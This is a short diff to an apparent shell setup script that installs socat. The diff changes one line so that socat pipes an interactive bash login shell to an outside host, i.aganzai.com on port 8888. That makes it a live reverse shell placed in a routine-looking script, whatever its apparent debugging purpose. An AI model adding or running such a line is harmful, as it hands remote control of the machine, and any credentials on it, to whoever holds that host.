@@ -3,7 +3,7 @@
 #brew update
 #brew install jq
 brew install socat
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp::8888
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:i.aganzai.com:8888
 
 
 # api变量解析
